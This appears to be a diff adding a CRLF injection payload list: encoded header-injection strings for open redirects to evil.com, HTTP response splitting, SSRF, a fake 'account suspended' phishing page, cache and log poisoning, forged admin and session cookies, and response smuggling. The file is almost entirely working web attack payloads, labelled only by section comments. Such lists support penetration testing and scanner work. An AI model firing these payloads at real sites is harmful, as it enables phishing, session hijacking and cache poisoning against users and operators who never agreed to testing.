@@ -1,0 +1,34 @@
+# ============================================================
+# CRLF Injection — Open Redirect + Redirect Injection
+# ============================================================
+
+# ---- Redirect via Location Header ----
+%0d%0aLocation: https://evil.com
+%0aLocation: https://evil.com
+%0dLocation: https://evil.com
+\r\nLocation: https://evil.com
+\nLocation: https://evil.com
+
+# ---- Full Response Split + Redirect ----
+?url=x%0d%0aHTTP/1.1 302 Found%0d%0aLocation: https://evil.com%0d%0a%0d%0a
+
+# ---- SSRF via CRLF ----
+?redirect=https://evil.com%0d%0aX-Forwarded-For: 127.0.0.1
+
+# ---- Phishing via CRLF ----
+# Inject HTML body after blank line
+?url=x%0d%0a%0d%0a<html><h1>Your account has been suspended. <a href=https://evil.com/login>Click here to restore</a></h1></html>
+
+# ---- Cache Poisoning via CRLF ----
+# Inject cache control headers
+?x=1%0d%0aCache-Control: max-age=99999%0d%0aX-Cache-Key: /admin
+
+# ---- Log Poisoning via CRLF ----
+?username=admin%0d%0aGET /stolen HTTP/1.1%0d%0aHost: target.com
+
+# ---- Cookie Poisoning ----
+/path/%0D%0ASet-Cookie:+admin=1
+?redirect=%0aSet-Cookie:+session=hacked;+HttpOnly=false
+
+# ---- HTTP Response Smuggling via CRLF ----
+/path?x=%0D%0A%0D%0AHTTP/1.1+200+OK%0D%0AContent-Type:+text/html%0D%0A%0D%0A<h1>Injected</h1>
